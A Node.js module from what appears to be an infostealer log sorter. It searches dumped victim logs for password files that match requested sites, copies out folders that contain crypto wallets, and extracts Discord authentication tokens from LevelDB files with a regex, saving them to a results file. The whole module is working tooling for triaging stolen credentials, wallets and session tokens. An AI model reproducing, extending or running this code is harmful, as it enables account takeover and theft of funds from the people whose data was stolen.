const fs = require('fs');
const fs2 = require('fs-extra');
const colors = require('colors');
const glob = require('fast-glob');
const prompts = require('prompts');
const cliProgress = require('cli-progress');
const langlist = require('./../lang.json');
const check_folder = './logs';
const results_folder = './results';
let version = "0.5";

let cryptofolders = ["Crypto Wallet", "Crypto Wallets", "Coins", "cryptocurrency", "Wallets", "coldwallets", "crypto"];
let zxc = [];

let lang = false;

module.exports = {
    setlang: function (lang_select) {
        lang = lang_select;
    },

    logo: function () {
        console.clear();
        console.log('');
        console.log(`${`  ██████████████████████████████████████████████████████ `.brightBlue} ${`v`.grey}${version.grey}`);
        console.log(`${`  ██▀▄ ██▄ █ ▄█▄ ▄▄ █ ▄▄▄▄█ ▄▄ █▄ ▄▄▀█ ▄ ▄ █▄ ▄▄ █▄ ▄▄▀█ `.brightBlue} ${` reborn `.bgRed.white}`);
        console.log(`${`  ██ ▀ ███▄▀▄███ ▄█▀█▄▄▄▄ █ ██ ██ ▄ ▄███ ████ ▄█▀██ ▄ ▄█ `.brightBlue}`);
        console.log(`${`  █▄▄█▄▄███▄███▄▄▄▄▄█▄▄▄▄▄█▄▄▄▄█▄▄█▄▄██▄▄▄██▄▄▄▄▄█▄▄█▄▄█ `.brightBlue}`);
        console.log(`${`  ▀██▀██▀▀▀█▀▀▀█████▀█████▀████▀██▀██▀▀███▀▀█████▀██▀██▀`}`.brightBlue);
        console.log('');
    },

    dev_logo: function () {
        console.log('');
        console.log(`
        ───────────────────────────────────────
        ───▐▀▄───────▄▀▌───▄▄▄▄▄▄▄─────────────
        ───▌▒▒▀▄▄▄▄▄▀▒▒▐▄▀▀▒██▒██▒▀▀▄──────────
        ──▐▒▒▒▒▀▒▀▒▀▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▀▄────────
        ──▌▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▄▒▒▒▒▒▒▒▒▒▒▒▒▀▄──────
        ▀█▒▒▒█▌▒▒█▒▒▐█▒▒▒▀▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▌─────
        ▀▌▒▒▒▒▒▒▀▒▀▒▒▒▒▒▒▀▀▒▒▒▒▒▒▒▒▒▒▒▒▒▒▐───▄▄
        ▐▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▌▄█▒█
        ▐▒▒▒▒▒▒▒▒ ${langlist[lang][2].brightRed} ▒▒▒▒▒▒▒▒▒█▒█▀─
        ▐▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒█▀───
        ▐▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▌────
        ─▌▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▐─────
        ─▐▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▌─────
        ──▌▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▐──────
        ──▐▄▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▄▌──────
        ────▀▄▄▀▀▀▀▀▄▄▀▀▀▀▀▀▀▄▄▀▀▀▀▀▄▄▀────────
        `);
        console.log('');
        console.log('');
    },

    clear_prev: function () {
        return new Promise(async (resolve, reject) => {
            const menu = await prompts([
                {
                    type: 'select',
                    name: 'text',
                    message: langlist[lang][11],
                    choices: [
                        { title: langlist[lang][9], value: true },
                        { title: langlist[lang][10], value: false }
                    ],
                    hint: langlist[lang][8]
                }
            ]);

            switch (menu.text) {
                case true:
                    fs2.emptyDirSync(results_folder);
                    resolve("Ok");
                    break;
                case false:
                    console.clear();
                    this.logo();
                    console.log('$'.cyan, langlist[lang][3]);
                    setTimeout(() => {
                        resolve("Ok")
                    }, 1000);
                    break;
                default:
                    console.clear();
                    this.logo();
                    console.log(` ${langlist[lang][4].bgRed}${langlist[lang][5].cyan}`);
                    console.log('');
                    break;
            }
        });
    },

    text_show: function () {
        return new Promise((resolve, reject) => {
            this.logo();
            console.log('$'.cyan, langlist[lang][6]);
            console.log('');
            fs.readFile('requests.txt', 'utf8', function (err, data) {
                const zapros = data.toString().split('\n').toString().split('\r,');
                console.log('', zapros);
                console.log('');
                console.log('');
                resolve("Ok");
            });
        });
    },

    copyFile: async function (request, result, check_folder) {
        try {
            await fs2.copy(`${check_folder}/${result}/`, `results/${request}/${result}/`);
            console.log(` [${request}]`, `${result}`.cyan, langlist[lang][7].brightGreen);
        }
        catch (err) {
            console.error(err)
        }
    },

    crypto: function () {
        return new Promise(async (resolve, reject) => {
            let invalid = 0;
            for (cryptofolder of cryptofolders) {
                let data = glob.sync(`${check_folder}/**/**/${cryptofolder}`, { onlyFiles: false });
                if (data == "") {
                    invalid++
                    if (invalid == cryptofolders.length) {
                        console.log(` [Crypto]`, ` ${langlist[lang][34]}${langlist[lang][35]}${langlist[lang][33]}`.brightRed);
                        resolve("Ok");
                    }
                }
                for (line of data) {
                    let tempstring = line.split(`${check_folder}/`)[1];
                    let cryptoresult = tempstring.substring(0, tempstring.search('/'));
                    await fs2.copy(`./${check_folder}/${cryptoresult}/`, `results/Crypto/${cryptoresult}/`);
                    console.log(` [Crypto]`, `${cryptoresult}`.cyan, langlist[lang][7].brightGreen);
                }
            }
            resolve("Ok");
        });
    },

    discord_ldb: function () {
        return new Promise(async (resolve, reject) => {
            let files = glob.sync(`./logs/**/Discord/**/*.l**`);
            let files2 = glob.sync(`./logs/**/Discord/*okens.txt`);
            if (!files.length && !files2.length) {
                console.log(` [Discord]`, `${langlist[lang][32] + langlist[lang][33]}`.brightRed);
                resolve("Ok");
            }
            else {
                for (let i = 0; i < files.length; i++) {
                    let data = await fs.readFileSync(files[i], 'utf-8');
                    let regexp = /(mfa\.[\w_\-]{84})|([\w]{24}\.[\w_\-]{6}\.[\w_\-]{27})/g
                    let strings = [...data.matchAll(regexp)];
                    for (string of strings) {
                        if (string != undefined) {  
                            for (shit of string) {
                                if (shit != undefined) {
                                    let shitcheck = shit.match(/([A-z]|[0-9])*/);
                                    if (shitcheck[0].includes("mfa") == false) {
                                        let tocheck = Buffer.from(shitcheck[0], "base64").toString("utf-8");
                                        if (tocheck.match(/^[0-9]+$/) != null) {
                                            zxc.push(shit);
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            resolve("Ok");
        });
    },

    tokens_filter: function () {
        return new Promise(async (resolve, reject) => {
            if (!fs.existsSync(`${results_folder}/Discord`)) {
                fs.mkdirSync(`${results_folder}/Discord`);
                fs.appendFileSync(`${results_folder}/Discord/output_tokens.txt`, "");
            }

            let uniq_zxc = new Set(zxc);

            for (writing_zxc of uniq_zxc) {
                fs.appendFileSync(`${results_folder}/Discord/output_tokens.txt`, `${writing_zxc}\r\n`, 'utf-8');
                console.log(` [Discord]`, `${writing_zxc}`.cyan, langlist[lang][7].brightGreen);
            }
            resolve("Ok");
        });
    },

    sorter: async function () {
        this.logo();
        console.log('$'.cyan, langlist[lang][6]);
        console.log('');
        const content = fs.readFileSync('requests.txt');
        const zapros = content.toString().split('\n').map(a => a.trimEnd());
        console.log('', zapros);
        console.log('');
        let zxcfiles = glob.sync(`${check_folder}/**/**/*assword*.txt`);
        if (zxcfiles == "") {
            console.log(` [Requests]`, `${langlist[lang][34]}${langlist[lang][36]}${langlist[lang][33]}`.brightRed);
        }
        for (folderpath of zxcfiles) {
            let data = fs.readFileSync(folderpath, 'utf8');
            for (request of zapros) {
                if (data.includes(request)) {
                    let tempstring = folderpath.split(`${check_folder}/`)[1];
                    let result = tempstring.substring(0, tempstring.search('/'));
                    await this.copyFile(request, result, check_folder);
                }
            }
        }
    },

    main: async function () {
        switch (parseInt(1)) {
            case 1:
                console.clear();
                this.logo();
                const mainaction = await prompts([
                    {
                        type: 'multiselect',
                        name: 'text',
                        message: langlist[lang][27],
                        choices: [
                            { title: langlist[lang][28], value: 1 },
                            { title: langlist[lang][29], value: 2 },
                            { title: langlist[lang][30], value: 3 }
                        ],
                        hint: langlist[lang][31],
                        instructions: ""
                    }
                ]);
                console.log('');

                return new Promise(async (resolve, reject) => {
                    if (mainaction.text.includes(1)) {
                        await this.sorter();
                    }
                    if (mainaction.text.includes(2)) {
                        await this.crypto();
                    }
                    if (mainaction.text.includes(3)) {
                        await this.discord_ldb().then(async (res) => {
                            if (res == "Ok") {
                                this.tokens_filter();
                            }
                        })
                    }
                    resolve("Ok");
                });
        }
    }
}
